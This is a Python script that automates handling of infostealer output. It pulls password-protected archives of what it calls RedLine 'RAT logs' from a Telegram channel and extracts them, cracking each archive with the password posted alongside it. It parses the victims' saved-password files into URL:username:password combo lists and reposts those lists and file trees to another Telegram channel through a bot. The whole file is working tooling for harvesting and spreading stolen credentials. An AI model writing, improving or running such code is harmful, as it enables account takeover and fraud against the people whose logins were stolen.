import os,zipfile,rarfile,py7zr,multivolumefile,re,json,logging,shutil,aiofiles,asyncio
from telethon import TelegramClient
from telethon.sessions import StringSession
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from tqdm import tqdm
from telethon.tl.types import InputMessagesFilterDocument

load_dotenv(override=True)
logging.basicConfig(format='[%(levelname) %(asctime)s] %(name)s: %(message)s', level=logging.WARNING)
client = TelegramClient(StringSession(os.environ['STRING_SESSION']), os.environ['API_ID'], os.environ['API_HASH'])
bot = TelegramClient('bot', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e').start(bot_token=os.environ['BOT_TOKEN'])
mongo_client = MongoClient(os.environ['MONGODB_URI'], server_api=ServerApi('1'))

def extract_file(inputFile, outputFolder, password=None):
    if inputFile.lower().endswith('.zip'):
        with zipfile.ZipFile(inputFile, 'r') as zip_ref:
            if password is not None:
                zip_ref.setpassword(password.encode('utf-8'))
            zip_ref.extractall(outputFolder)
    elif inputFile.lower().endswith('.rar'):
        with rarfile.RarFile(inputFile, 'r') as rar_ref:
            if password is not None:
                rar_ref.setpassword(password)
            rar_ref.extractall(outputFolder)
    elif inputFile.lower().endswith('.7z'):
        with py7zr.SevenZipFile(inputFile, 'r', password=password) as seven_zip_ref:
            seven_zip_ref.extractall(outputFolder)
    elif inputFile.lower().endswith(('.7z.001', '.7z.0001')):
        with multivolumefile.open(inputFile.rsplit('.7z', 1)[0]+'.7z', mode='rb') as target_archive:
            with py7zr.SevenZipFile(target_archive, 'r', password=password) as seven_zip_ref:
                seven_zip_ref.extractall(outputFolder)
    else:
        raise Exception("Unknown file format")

async def writeFileTree(root_path, file_to_write, prefix=""):
    entries = sorted(os.listdir(root_path))
    entries_count = len(entries)
    for i, entry in enumerate(entries):
        full_path = os.path.join(root_path, entry)
        connector = "└── " if i == entries_count - 1 else "├── "
        await file_to_write.write(prefix + connector + entry + "\n")
        if os.path.isdir(full_path):
            extension = "    " if i == entries_count - 1 else "│   "
            await writeFileTree(full_path, file_to_write, prefix + extension)

replacers = {
    'a_username': ['USER LOGIN:', 'Login:', 'Username:', 'USER:', 'U53RN4M3:'],
    'b_password': ['USER PASSWORD:', 'Password:', 'PASS:', 'P455W0RD:'],
    'c_url': ['Host:', 'Hostname:', 'URL:', 'UR1:', 'Url:'],
}

def str_replace(needle, rep, haystack):
    if type(needle)==list or type(needle)==tuple:
        for n in needle:
            haystack = str_replace(n, rep, haystack)
        return haystack
    else:
        return haystack.replace(needle, rep)

async def parseULP(redline_txt):
    keys = replacers.keys()
    try:
        async with aiofiles.open(redline_txt, 'r', encoding='utf-8') as f:
            obj = {}
            async for line in f:
                for k in keys:
                    line = str_replace(replacers[k], f'{k}:', line)
                line = [x.strip() for x in line.split(':', 1)]
                if len(line) != 2:
                    continue
                elif line[0] in obj:
                    obj = {line[0]: line[1]}
                elif line[0] in keys:
                    obj[line[0]] = line[1]
                if len(obj)==len(keys):
                    yield ':'.join(dict(sorted(obj.items())).values())
                    obj = {}
    except:
        pass

def findPasswordsFile(extract_path):
    for dirpath, dirnames, filenames in os.walk(extract_path):
        for file in filenames:
            if 'password' in file.lower() and file.lower().endswith('.txt'):
                return os.path.dirname(dirpath), file
    return None

async def ulpDump(extract_path, dump_file):
    extract_path, file_name = findPasswordsFile(extract_path)
    async with aiofiles.open(dump_file, 'w', encoding="utf-8") as f:
        for logdir in os.listdir(extract_path):
            logdir = os.path.join(extract_path, logdir)
            if not os.path.isdir(logdir):
                continue
            combofile = os.path.join(logdir, file_name)
            if not os.path.isfile(combofile):
                continue
            async for line in parseULP(combofile):
                await f.write(f'{line}\n')

class dlProgress:
    def __init__(self, total=100):
        self.current = 0
        self.last = 0
        self.pbar = tqdm(
            total=total,
            unit='iB',
            unit_scale=True,
            unit_divisor=1024,
            desc='Downloading'
        )
    def update(self, current, total):
        self.pbar.update(current-self.last)
        self.last = current

async def main():
    database = mongo_client.cfg.default
    last = database.find_one({'key': 'LAST_MESSAGE_ID'})
    last = last if last else {'key': 'LAST_MESSAGE_ID', 'value':1}
    cwd = os.getcwd()
    LOG_CHANNEL = int(os.environ['LOG_CHANNEL'])
    async for message in client.iter_messages(int(os.environ['RAT_LOGS']), min_id=last['value'], filter=InputMessagesFilterDocument, reverse=True):
        try:
            print(f'Message ID: {message.id}')
            print(f'Start Download: {message.file.name}')
            file = await message.download_media(progress_callback=dlProgress(message.file.size).update)
            dest_folder = os.path.join(cwd, f'{message.id}')
            print('Extracting..')
            os.makedirs(dest_folder, exist_ok=True)
            try:
                await asyncio.to_thread(extract_file, file, dest_folder)
            except:
                shutil.rmtree(dest_folder)
                os.makedirs(dest_folder, exist_ok=True)
                await asyncio.to_thread(extract_file, file, dest_folder, message.text.split('```')[1])
            os.remove(file)
            ulp_csv = os.path.join(cwd, f'ulp_{message.id}.csv')
            file_tree = os.path.join(cwd, f'tree_{message.id}.txt')
            await ulpDump(dest_folder, ulp_csv)
            async with aiofiles.open(file_tree, 'w', encoding="utf-8") as f:
                await writeFileTree(dest_folder, f)
            await bot.send_file(LOG_CHANNEL, file=ulp_csv)
            await bot.send_file(LOG_CHANNEL, file=file_tree)
            database.update_one({'key': 'LAST_MESSAGE_ID'}, {"$set": {"value": message.id}}, upsert=True)
            await asyncio.to_thread(shutil.rmtree(dest_folder))
        except KeyboardInterrupt:
            break
        except:
            pass

with client:
    client.loop.run_until_complete(main())
